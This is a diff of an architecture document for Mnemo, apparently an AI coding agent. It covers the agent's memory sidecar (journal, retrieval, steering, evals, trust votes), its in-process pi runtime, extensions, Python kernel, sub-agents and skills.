@@ -13,25 +13,27 @@ Companion: `docs/MNEMO.md` (high level). Superseded material is in
 ## 1. Process topology
 
 ```
-terminal ─▶ mnemo (Go TUI)
-              │  stdin/stdout, JSONL — pi RPC commands + events
-              ▼
-            node agent/bin/mnemo.ts --mode rpc --no-builtin-tools
-              ├── stdin/stdout JSON-RPC ─▶ memsrv (Rust)  ──▶ journal.jsonl (locked)
-              ├── stdin/stdout JSONL     ─▶ python3 agent/kernel/ipy_bridge.py
-              ├── stdio JSON-RPC 2.0     ─▶ MCP servers
-              └── spawn (print mode)     ─▶ child mnemo.ts  (subagent, own memsrv, same journal)
+terminal ─▶ mnemo  (Bun: the Ink interface and a pi session, one process)
+              ├── stdin/stdout JSON-RPC ─▶ memsrv (Rust)  ──▶ memory/journal.jsonl (locked)
+              ├── stdin/stdout JSONL     ─▶ python3 ipy_bridge.py          (the ipy_run tool)
+              └── in process             ─▶ sub-agents (more pi sessions on the same host)
+
+Claude Code hooks, MCP clients ─▶ mnemo memory hook|mcp ─▶ its own memsrv ─▶ the same journal
 ```
 
-Four boundaries, one shape: one JSON object per line, a line-buffered reader on
-the far side. The cost is four near-identical request/response correlators; the
-payoff is no protocol dependency, recorded-lines testability, and a pipe a human
-can read.
+Two child-process boundaries (three with the MCP server `mnemo memory mcp`), one
+shape: one JSON object per line, a line-buffered reader on the far side. The cost
+is near-identical request/response correlators (`MemoryClient`, `KernelClient`);
+the payoff is no protocol dependency, recorded-lines testability, and a pipe a
+human can read. pi, the agent loop, is not across a boundary: it runs in the app,
+and `Controller` is the only caller of the session.
 
-**Sessions vs memory.** `~/.pi/agent/sessions/<encoded-cwd>/*.jsonl` are
-conversations (pi writes them, keyed by working directory — which is why the TUI
-spawns the agent with `cmd.Dir` set to the project). The memory journal is
-cross-session and cross-project. Neither is derivable from the other.
+**Sessions vs memory.** `~/.mnemo/agent/sessions/<encoded-cwd>/*.jsonl` are
+conversations (pi writes them, keyed by working directory — a session is created
+for the agent's `cwd`). The memory journal (`~/.mnemo/memory/journal.jsonl`) is
+cross-session and cross-project. Neither is derivable from the other. A third
+thing, `memory/sessions.db`, is an index over both Mnemo's sessions and Claude
+Code's, derived and rebuildable.
 
 ---
 
@@ -52,24 +54,26 @@ deleted — it keeps its id, key and value, and `memsrv`'s `history` op returns
 it alongside what replaced it. The derived state text says so (`N retired
 value(s) kept as history`) and does not re-state a retired value anywhere, log
 lines included: the facts block IS the fact record. `fact`'s `append: true` is
-the explicit opt-out, used only where a key really is a set (a harness's tool
-list). An **Edge** is typed
+the explicit opt-out, used only where a key really is a set. An **Edge** is typed
 (`SuppliesContext`, `PartOf`, `DerivedFrom`, `Supersedes`, `ActivatedWith`),
 weighted, directional, with success/failure counters and `valid_from`/
 `invalid_at` — `Unlink` is a soft kill, and `Edge::alive_at(t)` is the three
 checks anything reading "now" needs.
 
-Eleven `Op` variants are the **only** way state changes: `CreateNode`,
+Twelve `Op` variants are the **only** way state changes: `CreateNode`,
 `AddFact`, `SupersedeFact`, `SetArea`, `DeleteNode`, `Link`, `Unlink`,
-`Reweight`, `RecordOutcome`, `PushContext`, `CommitLog`. `StoreData::apply` is
+`Reweight`, `RecordOutcome`, `PushContext`, `CommitLog`, `RecordUsefulness`. `StoreData::apply` is
 the single place they take effect; `persist::replay` folds the journal back into
 a store. *Replay(ops) == state* is an invariant stated on the enum, and it is
 what makes the journal — not any in-memory structure — the source of truth.
 `DeleteNode` is soft by default; nothing in the design can erase knowledge.
 
-Every writer (memsrv, memcli, a subagent's memsrv) takes an advisory `fd_lock`
-on the sibling `.lock` file around each append, which is why several processes
-share one journal without interleaving partial lines.
+Every writer (any number of memsrv processes — two Mnemo windows, a Claude Code
+hook, an MCP server — and memcli) takes an advisory `fd_lock` on the sibling
+`.lock` file around each append, which is why several processes share one journal
+without interleaving partial lines. `memsrv` runs every request under that lock
+and first applies whatever the others appended, so its store is current before it
+reads or allocates an id (two stale stores once both handed out node 1).
 
 ### 2.2 Brain areas and routing
 
@@ -91,45 +95,77 @@ will be wrong; the discount is why that is survivable.
 
 ### 2.3 Retrieval
 
-`search()` embeds the query, scores every live node by cosine (brute force,
-"fine to ~100k nodes"), filters, sorts, takes `k`. Then `expand()` does one hop
-of graph-aware rerank: neighbours along live `PartOf`/`SuppliesContext`/
-`ActivatedWith`/`DerivedFrom` edges score `seed × 0.5 × max(edge_weight, 0.1)`,
-and dead edges propagate nothing. A neighbour that fails the area/kind filter is
-dropped even when reached from a passing seed — "a filtered-out node must not
-sneak back in as a neighbour". `search_ann` (HNSW) exists with a test proving
-agreement with brute force, but `memsrv` calls the brute-force path.
+`search()` embeds the query (after a tiny curated query-side alias map), scores
+every live node by cosine (brute force, "fine to ~100k nodes"), applies the
+usefulness bias and the area discount, filters, sorts, takes `k`. A node is
+embedded from its label, active facts and last three log lines. Then `expand()`
+does one hop of graph-aware rerank: neighbours along live `PartOf`/
+`SuppliesContext`/`ActivatedWith`/`DerivedFrom` edges score `seed × 0.5 ×
+max(edge_weight, 0.1)`, and dead edges propagate nothing. A neighbour that fails
+the area/kind/scope filter is dropped even when reached from a passing seed — "a
+filtered-out node must not sneak back in as a neighbour". A `scope` (a project
+node) leaves out nodes attached by `PartOf` to some other project; unattached
+nodes, such as the user profile, stay visible everywhere.
 
-Embeddings are pluggable. `HashingEmbedder` (256-dim, deterministic, offline) is
-the default; the OpenRouter embedder (1024-dim, `lfm-2.5-embedding-350m:free`)
-activates when a key is present **and** `SEA_MEMORY_REMOTE=1` is set by the
-agent-side client. The disk cache is keyed `sha256(model ‖ text)`; vectors are
-derived, so switching embedders costs one reindex and nothing else. Measured:
-68%/73%/0.697 (hash) vs 82%/95% (real) on the eval corpus.
+Brute force is the default. `search_ann` (HNSW) is reachable from `memsrv` only
+behind `MNEMO_SEARCH_ANN=1` **and** at least `ANN_MIN_NODES = 2048` live nodes
+(`plan_search`); below that it falls back to brute force, and the response carries
+`path` (`brute`/`ann`) and a `why`. The index is rebuilt per search, so it only
+pays in read-mostly sessions. Results are cached in a 256-entry LRU keyed on
+(normalized query, area filter, `k`, scope) and cleared on every write, own or
+foreign; the response says `cache: hit|miss`.
+
+Embeddings are pluggable and chosen once, at `memsrv` start, in this order:
+
+1. **Your own server** — `MNEMO_EMBED_URL` + `MNEMO_EMBED_MODEL` (OpenAI-compatible
+   `/v1/embeddings`: Ollama, LM Studio, llama.cpp, vLLM); `MNEMO_EMBED_KEY` is sent
+   only if set; `MNEMO_EMBED_TIMEOUT_MS` bounds a call.
+2. **OpenRouter** — `OPENROUTER_API_KEY` present (`OPENROUTER_EMBED_MODEL`, default
+   `liquid/lfm-2.5-embedding-350m:free`; `OPENROUTER_EMBED_URL` and
+   `OPENROUTER_EMBED_TIMEOUT_MS` override).
+3. **`HashingEmbedder`** (256-dim, deterministic, offline) — the default and the
+   fallback.
+
+Both remote endpoints must be `https://` or this machine (the key and the text of
+every memory go there). Calls are time- and retry-bound — 10 s, two attempts, 1 s
+apart — and a failed call degrades to an empty vector (that node scores 0), never
+an error or a stall. The disk cache (`embed/embed-cache.json` beside the journal)
+is keyed `sha256(model ‖ text)`; vectors are derived, so switching embedders costs
+one reindex and nothing else. `memsrv` also reads `$MNEMO_HOME/.env` for settings
+the real environment lacks — never a file in the working directory, which could
+redirect the key and every memory's text. Retrieval quality is in §2.8.
 
 ### 2.4 Steering — how failure becomes structure
 
 `steer()` is a pure planner returning `Vec<Op>` + notes; the caller journals
-them, so steered histories replay exactly. In order:
+them, so steered histories replay exactly. `SteerOpts` has two switches the app
+sets (`dedupe: true`, `gap: false`; the sidecar's defaults are off and on). In
+order:
 
 1. **Log** the failure on the episode (always).
 2. **Pain marker, unconditionally, before any decision** — a new `Aspect` node
    forced to `Salience` with a `failure` fact, linked `DerivedFrom` and
    deliberately *not* `SuppliesContext`, so a pain marker can never become a
    blame target for the next failure. "Amygdala logic: capture that it hurt,
-   cheaply and unconditionally."
+   cheaply and unconditionally." With `dedupe`, a failure with the same
+   `failure_signature` (lowercased, digits collapsed, quotes and whitespace
+   normalised — "line 42" and "line 57" are one failure) reuses its earlier marker:
+   an `occurrences` count goes up and a `recurred` line names the episode,
+   instead of a new node each time.
 3. **Blame** — every live `SuppliesContext` feeder of the episode is checked for
    lexical token overlap with the failure text; an implicated feeder gets
    `RecordOutcome{success:false}` (−0.10 weight).
 4. **Correction**, if the caller supplied one (`fix: {node, fact, new_key,
    new_value}`) — a `SupersedeFact`, validated first (the target fact must exist
-   and be active).
+   and be active). The app does not use it: it records a fix as a `fix` fact on
+   the pain marker.
 5. **Switch** — if a blamed edge's projected weight falls below
    `SWITCH_THRESHOLD = 0.2` and another live feeder above it exists, unlink the
    bad edge and link the alternate.
-6. **Gap** — if nothing was implicated and there was no correction, create a
-   `gap: <tokens>` node wired as a new feeder, so a failure nobody can explain
-   still leaves a trace.
+6. **Gap** — if nothing was implicated, there was no correction and `gap` is on,
+   create a `gap: <tokens>` node wired as a new feeder, so a failure nobody can
+   explain still leaves a trace. The app turns this off: a tool error is not a
+   knowledge gap.
 
 `reinforce()` is the mirror: log, then `RecordOutcome{success:true}` (+0.05) on
 every live feeder.
@@ -144,16 +180,21 @@ share `MIN_SHARED_TOKENS = 2` tokens — "two sources that share only 'checkout'
 are the same project, not the same lesson". Surviving groups become `Semantic`
 lesson nodes; re-running emits nothing unless the sources changed (idempotent by
 construction). It is pure memory-layer work: no model, no network, exposed as
-`memsrv`'s `consolidate` and `mnemo consolidate`.
+`memsrv`'s `consolidate`. Nothing in the app calls it today: the shutdown pass
+and `mnemo consolidate` belonged to the previous stack, and the
+`MNEMO_CONSOLIDATE_THRESHOLD` that `consolidate.rs` mentions is read nowhere.
 
 ### 2.6 Wrappers and feedback
 
 `recall_brief(query)` returns a ready-to-inject block (routed areas, top-k hits
-with state text *always* inlined — never bare scores — and a provenance line).
+with state text *always* inlined — never bare scores — and a provenance line);
+the app builds its own recall from `search` instead (§2.9).
 `remember(summary)` auto-routes an area and creates node + fact + log in one
 call. Usefulness is captured as `useful`/`unhelpful` counters on nodes
-(`Op::RecordUsefulness`), applied as a `(useful − unhelpful) × 0.02` score bias
-— zero votes, zero bias, so the eval is untouched until real signal exists.
+(`Op::RecordUsefulness`, `mark_useful`), applied inside the sidecar as a
+`(useful − unhelpful) × 0.02` score bias — zero votes, zero bias, so the eval is
+untouched until real signal exists. The counters also travel in `dump` and
+`search` results, which is how the application weighs trust (§2.9).
 Votes deliberately do **not** enter `node_text`: a heavily-voted node would
 otherwise drift away from its own topic, since the embedding includes the last
 few log lines.
@@ -161,269 +202,327 @@ few log lines.
 ### 2.7 `memsrv` — the only integration surface
 
 Line-JSON-RPC over stdio: `{"id":N,"method":"M","params":{…}}` →
-`{"id":N,"ok":true,"result":…}`. It replays the journal on startup, opens an
-embedder, and serves one request per line until `exit`. Methods: `ping`, `dump`,
-`state`, `history`, `search`, `create_node`, `episode`, `fact`, `link`,
-`commit_log`,
-`steer`, `set_area`, `good`, `consolidate`, `mark_useful`, `stats`, `remember`,
-`recall_brief`, plus the audit-era additions (`unlink`, `reweight`,
-`record_outcome`). `fact` supersedes a same-key value unless `append: true`
-says the key is a set, and answers with the fact id it wrote plus the id it
-superseded; `history` returns every fact a node ever had with its status and
-`superseded_by`, which is where retired values are read. `dump` carries a
-`retired` count beside `facts`. Search results carry label, kind, area and state
-text — the
+`{"id":N,"ok":true,"result":…}`. It takes the journal path as its argument,
+replays the journal on startup, opens an embedder, and serves one request per line
+until `exit`. A request frame is capped at 1 MiB; an oversize or non-UTF-8 frame is
+answered with an error and drained, and never kills the sidecar. Methods: `ping`,
+`stats`, `dump`, `state`, `history`, `search`, `create_node`, `episode`, `fact`,
+`link`, `unlink`, `reweight`, `record_outcome`, `commit_log`, `steer`, `good`,
+`set_area`, `forget`, `consolidate`, `mark_useful`, `remember`, `recall_brief`.
+`fact` supersedes a same-key value unless `append: true` says the key is a set,
+and answers with the fact id it wrote plus the id it superseded; `history` returns
+every fact a node ever had with its status and `superseded_by`, which is where
+retired values are read. `dump` lists live nodes with `facts`, a `retired` count,
+`useful`/`unhelpful` votes and `feeders`; a forgotten node is gone from it though
+its ops stay in the journal. `search` takes `areas` (a hard filter) and `scope` (a
+project node), and results carry label, kind, area, state text and votes — the
 project learned once that ids plus scores are useless to a model. Clients:
-`agent/extensions/memory-layer.ts` (FIFO-queued, lazily spawned, agent tools),
-`agent/src/hooks/memory.ts` (the hooks sync), and `tui-go/internal/memory`
-(one reader loop, timeouts that do not leak, fail-fast on a dead sidecar).
-`memcli`, `memeval` and `mempolicy` are scripting/eval binaries that work on a
-journal directly.
+`packages/memory/src/client.ts` (`MemoryClient`: requests serialized on one pipe,
+chunks buffered into lines, a dead sidecar answers `{ok:false}` instead of
+throwing) under `service.ts` (`MemoryService`, which turns every failure into
+"nothing"). `memcli`, `memeval` and `mempolicy` are scripting/eval binaries that
+work on a journal directly.
 
 ### 2.8 Evals
 
 `memeval` reports Hit@1 / Hit@3 / MRR over a corpus of question → expected-node
 cases. `--hash` forces the deterministic embedder: the numbers are the gate
-(73% / 77% / 0.743, n=22) and every retrieval change is measured before and
-after. Real misses are left failing on purpose rather than tuned away; the one
-case that was closed (a paging query → alert routing) was closed by a measured
+(73% / 77% / 0.743, n=22; `tests/memeval_gate.rs` fails below them) and every
+retrieval change is measured before and after. Real misses are left failing on
+purpose rather than tuned away; the one case that was closed (a paging query → alert routing) was closed by a measured
 query-side alias map that moved Hit@1 68→73% with the other 21 rows
 byte-identical. `mempolicy` trains a learned steering policy from journal
 replay; on the real journal it reports "nothing to learn from" because the
 training rows were never emitted — that is finding M13 in
 `research/agentic-capability-review.md`.
 
+### 2.9 What the application does with it (`packages/memory/`)
+
+`MemoryService` is the semantics over the sidecar; `MemorySession` is the loop any
+agent drives (Mnemo's extension, a Claude Code hook, an MCP request, a replayed
+transcript).
+
+- **Standing nodes.** `project <identity>` (Spatial) and `user preferences`
+  (Semantic) hold the profiles: key → value facts, one current value per key.
+  A project's identity is its normalized git `origin` (so every clone shares it),
+  else `repo:<root>@<born>`, else `dir:<path>@<born>` (the folder's creation time
+  keeps `/app` in one container from being `/app` in the next). Everything written
+  in a session is attached to its project with `PartOf`, and recall searches with
+  that project as `scope`; another project's profile node is dropped client-side.
+- **Recall** (`MemoryService.recall`): a prompt of fewer than two words recalls
+  nothing; otherwise `4k` hits are fetched and filtered — not the profiles (they go
+  into the system prompt whole), not `gap:`/`lesson:`/`skill candidate` nodes, not a
+  pitfall without a fix, not an episode without a recorded goal, not anything
+  **distrusted** — then ranked by `score × trust`, where `trust = 2(up+1) /
+  (up+down+2)` (1 with no votes, toward 2 as it keeps helping, toward 0 as it is
+  marked wrong) and distrusted means `unhelpful − useful ≥ 2`.
+- **Votes.** A recalled item earns `useful` when the answer or a later tool call
+  reuses at least two of its *distinctive* words (not in the user's message, not
+  shared with the other recalled items; `Credit`) — conservative, and never a vote
+  down, since ignoring a memory is not evidence against it. The memory pane's `+`/
+  `-` are the explicit votes.
+- **Learning** (`MemorySession.end`): a clean run reinforces its feeders; then one
+  reflection call over a grounded digest returns facts (kept only if the user said
+  them or a tool showed them), the session record (goal, outcome, done, decisions,
+  open — also written as the project's `last session` fact), failure → fix pairs
+  (a fix joins its failure's marker when it shares two distinctive words with it,
+  otherwise it is a pitfall of its own) and at most one skill. A skill is saved
+  when the user asked for it or the same procedure was seen in a second session,
+  and only after an approval dialog that shows the file. Everything written passes
+  `redact` and `unsafeMemory`, which refuses text that tries to steer the agent,
+  smuggle a secret out or hide characters (memory is injected into later prompts,
+  of every attached agent, so a fact is a standing instruction).
+- **Steering.** Each failed tool call (a refusal by the gate is not one) is a
+  `steer` with `dedupe` on and `gap` off. Before a `bash` call, `guard` looks for a
+  pitfall whose failure names that exact command and whose fix is not yet applied in
+  this run, and blocks it once per session with the fix.
+- **Maintenance.** `planTidy`/`applyTidy` (`mnemo memory tidy`): *duplicate* (two
+  facts in one profile, or two pitfalls, that say the same thing — equal once
+  normalized, or ≥ 85% of their words in common), *stale* (a project fact whose
+  every file path is gone from the project root), *distrusted*. Nothing is deleted:
+  a fact is retired by superseding it with `(forgotten)`, a node by `forget`.
+  `curateSkills` (`mnemo memory curate`) sorts skills by their `last used` fact.
+
 ---
 
-## 3. The agent runtime (`agent/`)
+## 3. The agent runtime (`app/`)
 
-### 3.1 The pi shim and the four extensions
+### 3.1 pi in process, and the nine extensions
 
-`bin/mnemo.ts` is a shim: a Node-version guard, local subcommands
-(`auth status|logout`, `traces`, `consolidate`, `schedule …`, `--list-sessions`,
-`--list-models`) that need no provider, then `main(args, {extensionFactories})`
-from `@earendil-works/pi-coding-agent`. `--no-builtin-tools` is passed so the
-only tools in a session are Mnemo's — which is why Mnemo has its own
-`bash_exec`/`read_file`/`write_file`/`apply_edit`: they carry the permission and
-approval integration pi's built-ins do not know about.
+`bin/mnemo.ts` is the only place that touches the process: arguments, the
+terminal, exit codes. It handles the local subcommands that need no provider
+(`doctor`, `update`, `uninstall`, `memory …`) and otherwise builds a pi session
+runtime (`createAgentSessionRuntime`, `src/runtime/runtime.ts`) **in this
+process** — no RPC, no child process. pi owns the loop, the built-in tools,
+sessions, compaction, skills, prompt templates and provider auth; the models'
+credentials live in `~/.mnemo/agent/` (`PI_CODING_AGENT_DIR` points pi there, apart
+from a standalone pi install). A folder's own `.pi/` extensions, settings, prompts
+and skills load only if the folder is trusted (`ProjectTrustStore`; `--trust-project`
+or an answer at launch), because extensions run as code before any approval.
 
-Four `InlineExtension`s (inline = shipped with the binary, no per-user install,
-identical in every mode):
+Mnemo's behaviour is nine `InlineExtension`s (inline = shipped with the binary, no
+per-user install, identical in every mode), built in this order so the gate sees
+every call first (`src/extensions/index.ts`). They share one `Host`
+(`extensions/host.ts`): where state lives, the model runtime, the memory service,
+the mode, and — when there is an interface — a way to ask the user. A sub-agent
+gets a copy one level deeper.
 
-| extension | hooks it uses |
+| extension | what it does |
 |---|---|
-| `sea-tools-inline` | registers every tool; wires the kernel dispatcher |
-| `sea-memory` (`memory-layer.ts`) | `session_start` (episode), `before_agent_start` (directive + recall), `tool_execution_end` (episode log), `turn_end`, `session_shutdown` (consolidate) |
-| `approval-gate` | `tool_call` — the only hook that can **block**; permission rules, plan mode, and an approval dialog the interface answers over pi's extension-UI protocol |
-| `tracing` | `tool_call`/`tool_result`, `turn_start`/`turn_end`, session span |
-| (`hooks-inline`, `schedules-inline`) | the hooks engine and the scheduler, including `/hook`, `/schedule`, `/trigger`, `/now` commands |
+| `mnemo-policy` | `tool_call` — the only hook that decides: rules, mode, grants, then the approval dialog (§3.6) |
+| `mnemo-checkpoints` | `tool_call` on `edit`/`write`: keeps the file's bytes under the current turn (rewind) |
+| `mnemo-shell` | re-registers pi's `bash` with the provider keys taken out of the command's environment |
+| `mnemo-memory` | `before_agent_start` (directive + profiles into the system prompt, recall as a hidden message), `tool_call` (the known-fix guard), `tool_execution_*`, `turn_end`, `agent_end` (verify nudge, then reflection in the background), `session_shutdown`; tools `memory_search`, `session_search`, `memory_remember`, `memory_steer` |
+| `mnemo-kernel` | `ipy_run` (absent when no working Python is found) |
+| `mnemo-agents` | `spawn_subagent` (absent at the depth cap) |
+| `mnemo-skills` | `create_skill`, `update_skill` |
+| `mnemo-escalate` | counts failed checks; moves a run to the stronger model (`--escalate`, `MNEMO_ESCALATE_MODEL`) |
+| `mnemo-trace` | one JSON line per tool call and turn |
+
+`Controller` (`runtime/controller.ts`) is the only caller of the session: it owns
+the transcript, the dialog queue and the chrome state, and nothing in `ui/`
+imports pi. That split is what lets a whole turn be tested with a faux model and no
+terminal (`src/runtime/demo.ts`, `app/test/helpers.ts`).
+
+**Provider keys.** `runtime/env.ts` builds the environment of everything the agent
+starts (`childEnv`): Mnemo's own minus the model-provider keys it knows
+(`PROVIDER_KEYS`, pi-ai's list) and the variables `models.json` interpolates for a
+custom provider. `MNEMO_PASS_ENV=NAME,NAME` hands named ones back. It is applied to
+`bash` (`mnemo-shell`), the Python kernel and best-of checks. Mnemo itself still
+reads the keys; only children lose them.
 
 ### 3.2 Tools
 
-`allTools` (16, or the inventory minus the policy below) from `src/tools/index.ts` — `bash_exec`, `read_file`,
-`write_file`, `apply_edit`, `glob_list`, `ipy_run`, `list_skills`, `load_skill`,
-`create_skill`, `patch_skill`, `retire_skill`, `spawn_subagent`, `create_harness`,
-`web_fetch`, `web_search`, `read_image` — plus three memory tools, MCP tools
-discovered before `main()` runs, and whatever a harness bundle adds at runtime.
-`web_search`/`web_fetch` are registered at `session_start` only if a
-globally-installed pi package has not already claimed those names, because two
-tools with one name make pi refuse the whole extension and kill the session at
-startup.
+pi's built-in tools are `read`, `bash`, `edit`, `write` by default (`grep`, `find`,
+`ls` and `powershell` exist; a read-only sub-agent gets `read grep find ls
+memory_search`). Mnemo adds `ipy_run`; `memory_search`, `session_search`,
+`memory_remember`, `memory_steer` (only when the sidecar is installed);
+`spawn_subagent`; `create_skill` and `update_skill`. There is no tool-exposure file
+in the app: the set is what the extensions register when the session starts.
 
-**Tool exposure** (issue #14 P6) is the other half of that sentence, and it is a
-different question from permissions: `permissions.json` decides whether a call is
-allowed once the model asks, `~/.mnemo/tools.json` decides whether the tool is
-offered at all — the one that costs a turn when it is wrong, since `web_search`
-with no key is otherwise offered every session and explains itself every session.
-The format is `{ "disabled": ["web_search", …] }`, unioned with
-`<project>/.mnemo/tools.json`, and it is applied in `src/tools/index.ts`: `allTools`
-is the inventory minus the disabled names, so the tool is absent from the prompt
-*and* from the in-kernel `tools.<name>()` dispatcher, which is built from the same
-array. Polarity is deliberate — a *disabled* list means a tool added in a later
-version is on by default for everyone who already has a file, where an enabled
-list would quietly take a new capability away from every user who never heard of
-it. There is no wildcard and no patterns: `"*"` is only useful with an enable list
-to add things back, and two lists of opposite polarity is the second registry this
-whole issue exists to prevent. A project file can only restrict (a union, never an
-override), so it needs no trust decision — a file that could *re-enable* what the
-operator turned off would. The file is read once, at extension load, so an edit
-lands on the next run: invariant 6 makes the tool list part of the cached prompt
-prefix, and that is enforced by construction rather than by a notice. With no file
-present the list is exactly what it was. Two things it does not have, stated
-because a policy file with a typo fails silently: nothing reads `disabled` back
-(the interface's `/tools` is the unbuilt half of P6), and a name that matches no
-tool is therefore reported nowhere.
+`session_search` is a different question from `memory_search`: memory keeps what
+was *learned*, this keeps the record — every message and command of Mnemo's and
+Claude Code's sessions in one SQLite FTS5 index (BM25), refreshed before each
+search and redacted on the way in, within the current project unless
+`all_projects`.
 
-`patch_skill` is the self-improvement seam and is deliberately hard to use
-wrong: it needs a stated reason and at least one piece of memory evidence, edits
-by anchored replacement (whole-file rewrites are not offered), refuses a stale
-`expectedHash`, refuses a path outside `~/.pi/agent/skills` and project
-`.agents/skills` (never `.claude/`, never a package directory), refuses an
-anchor that is not unique, refuses a result with broken frontmatter or one that
-stops the skill being discoverable — and writes a timestamped copy of the
-previous body under `~/.mnemo/skill-history/<name>/` first, so every patch is
-reversible without git. `retire_skill` marks a skill retired instead of deleting
-it. The loop that decides *when* to patch is J11 in
-`research/memory-runtime-design.md`.
+`create_skill` and `update_skill` are the self-improvement seam. Both go through the
+gate as edits. A skill is a `SKILL.md` a person can read: project scope under the
+repository's `.agents/skills/<name>/`, user scope under `~/.mnemo/agent/skills/`,
+and also a Procedural node `skill <name>` in memory so a later session can recall
+that it exists. `update_skill` needs the full new instructions and a reason, and
+writes a timestamped copy of the previous body under `~/.mnemo/skill-history/<name>/`
+first. A skill the memory loop proposes after a run (a new one, or a patch to one
+that run read and found wrong) is written only after an approval dialog showing the
+file, with the old body kept under `agent/skill-history/`. The loop that decides
+*when* to patch is J11 in `research/memory-runtime-design.md`.
 
 ### 3.3 The Python kernel — programmatic tool calling
 
-`ipy_run` submits a program to a persistent kernel
-(`agent/kernel/ipy_bridge.py`) over line-JSON. From inside, `tools.<name>(…)`
-sends an out-of-band `tool_call` line and blocks for the reply;
-`tools.parallel([…])` does the same in bounded waves of
-`MAX_PARALLEL_TOOL_CALLS = 8`. Each in-kernel call goes through the **same**
-`decideApproval` gate as a normal call (`src/tools/kernel_tools.ts`), so deny
-rules and plan mode hold inside generated code; an `ask` resolves to allow
-because no `ctx.ui` is reachable from the kernel, which is the same behaviour a
-non-TTY run gets. The dispatcher includes the memory and MCP tools, so a program
-can search memory, spawn subagents and build harnesses.
+`ipy_run` submits a program to a persistent kernel (`app/python/ipy_bridge.py`,
+written to `~/.mnemo/kernel/` on first use) over line-JSON; `KernelClient`
+(`src/kernel/kernel.ts`) serializes the cells. From inside, `tools.<name>(…)` sends
+an out-of-band `tool_call` line and blocks for the reply; `tools.parallel([…])`
+sends the whole batch in one `tool_calls` line, the host runs the calls
+concurrently, and results come back in order with a failed call as a `ToolError` in
+place. Each in-kernel call goes through `ctx.executeTool`, so it passes the same
+gate as a call the model makes directly (`extensions/kernel.ts`). The gate does not
+look inside the Python itself (`SECURITY.md`).
 
 Mechanics worth knowing: output capture uses `redirect_stdout`, so the protocol
-writes on the *raw* file objects captured at startup — otherwise a `print()`
-would be swallowed into the result field and a tool call would be captured
-instead of delivered. A cell past its `timeout_ms` (120s default) kills the
-kernel; the next call transparently respawns an empty namespace. No per-call
-timeout exists on the in-kernel channel (issue #6), and the process has no
-memory/CPU bounds (issue #11).
+writes on the *raw* file objects captured at startup — otherwise a `print()` would
+be swallowed into the result field and a tool call would be captured instead of
+delivered. A cell is bounded: the tool's `timeout` (seconds, default 120, at most
+600) and the abort signal (`esc`) both end it by killing the interpreter, since
+that is the only way to interrupt a running cell; the next call transparently
+respawns an empty namespace and the error says so. Out-of-band lines are always
+answered (a kernel blocked on a reply that never comes is indistinguishable from a
+hung cell), and a replaced interpreter's late `exit` does not resolve its
+successor's requests. On Linux the bridge caps its address space
+(`RLIMIT_AS`, `MNEMO_KERNEL_MEMORY_MB`, default 8192, 0 for none) so a runaway cell
+raises `MemoryError`; macOS does not enforce it and Windows has no `resource`. The
+interpreter is found by probing, not trusting (`MNEMO_PYTHON` or `SEA_PYTHON`, then
+`python3`, `python`): on Windows `python3` can be a Store shim that is present and does
+nothing. The process has no CPU bound.
 
 ### 3.4 Subagents
 
-`spawn_subagent` spawns a complete second `mnemo.ts` in print mode with a
-parent-composed brief (never the parent's transcript), a hard timeout, and
-`ANSWER:` extraction from stdout. The child inherits the memory journal path and
-the trace parent ids through an explicit `childMemoryEnv()`, so it reads and
-writes the *same graph* and its spans nest under the call that spawned it. An
-optional `model` parameter must resolve against a logged-in provider's catalogue
-or the call **fails loudly** — a silent fallback would look like it worked.
+`spawn_subagent` runs a second pi session **in the same process** with a
+parent-composed brief (never the parent's transcript), the parent's model, an
+in-memory session, and `access` of `read-only` (default) or `full`. Its host is a
+copy of the parent's one level deeper, so the memory service, the approval prompts
+(the user still answers for every edit and command), the refusal signals and the
+checkpoints are shared; its episode is linked to the parent's with `PartOf`, so
+what it learns the parent recalls. A sub-agent does not reflect — its work is part
+of the parent's run, which reflects on the whole — and a checkpoint taken during
+its turn is filed under the parent's message. Its steps stream into the parent's
+tool block.
 
-Delegation is **depth-capped** (issue #6/C4): a child is spawned with
-`MNEMO_SUBAGENT_DEPTH` = the parent's depth + 1, and `spawn_subagent` returns an
-ordinary tool error — naming the limit and the way to raise it — once the
-process is at `MNEMO_SUBAGENT_MAX_DEPTH` (default 3, inherited by children, so it
-is set once on the top-level agent; 0 forbids delegation, and an unusable value
-falls back to the default rather than to "unlimited"). The counter rides in the
-environment because a child shares nothing else with its parent, and it is
-stamped by the parent, so a child cannot reset the chain by omission.
+Delegation is **depth-capped**: `Host.maxDepth` (default 2) is a field, not an
+environment variable; `spawn_subagent` is not registered once `depth >= maxDepth`,
+so the session you talk to (depth 0) and its children (1) can delegate and a
+grandchild (2) cannot.
 
 ### 3.5 Skills, hooks, schedules
 
-**Skills**: `SKILL.md` with frontmatter, discovered from the same roots the TUI
-walks (`.claude`/`.pi`/`.agents`, project-first), creatable by the agent
-(`create_skill`), and auto-populated by harness bundles through the bridge.
+**Skills**: `SKILL.md` with frontmatter, discovered by pi from `.agents/skills`
+(the folder and its ancestors up to the git root), the project's `.pi/skills` and
+the agent directory's `skills/`, creatable by the agent (§3.2) and
+curated by `mnemo memory curate` (a skill unused for 30 days is stale, for 90
+archived to `agent/skills-archive/`; only personal skills move, project skills
+belong to the team and are reported). Reading a skill's `SKILL.md` records a `last
+used` fact on its node.
 
-**Hooks** (`agent/src/hooks/`): manifests with `{id, trigger, matcher{tool,
-path}, command, timeout, on{block,audit,modify}}`, scoped project → user →
-global, at most one per id with the nearest winning, and disabled state in
-`~/.mnemo/hook-state.json`. Execution: a real shell on every platform —
-`sh -c` on POSIX, `cmd.exe /d /s /c` on Windows, or whatever `MNEMO_SHELL`,
-pi's `shellPath` or the manifest's own `shell` field names (`agent/src/hooks/shell.ts`
-resolves it; one that cannot be resolved is an audited error, never a crash and
-never a silent allow). A command with arguments is treated as a program line:
-the program token is resolved, the rest goes to the shell verbatim. JSON event
-on stdin, exit 0 = allow (stdout JSON is the response), exit 2 = block with the
-stderr reason shown to the model, anything else or a timeout = allow + an
-audited error — "a stuck hook never breaks the loop". Every invocation writes a
-redacted `hook` span into the same trace file as everything else.
+**Hooks, schedules, MCP servers as tools** are not in the app (roadmap: later).
+Memory is *offered to* MCP clients (`mnemo memory mcp`) and to Claude Code's hooks
+(`mnemo memory hook`), not the other way round.
 
-**Schedules** (`agent/src/schedule/`): `~/.mnemo/schedules.json`, cron/interval
-parsing, a daemon with an `O_EXCL` pid lease so two daemons cannot double-fire,
-and triggers `on_failure`, `on_uncommitted`, `on_cost_over` (fires; nothing acts
-on it — issue #8) and `on_push` (deferred). Each tick's work becomes an episode,
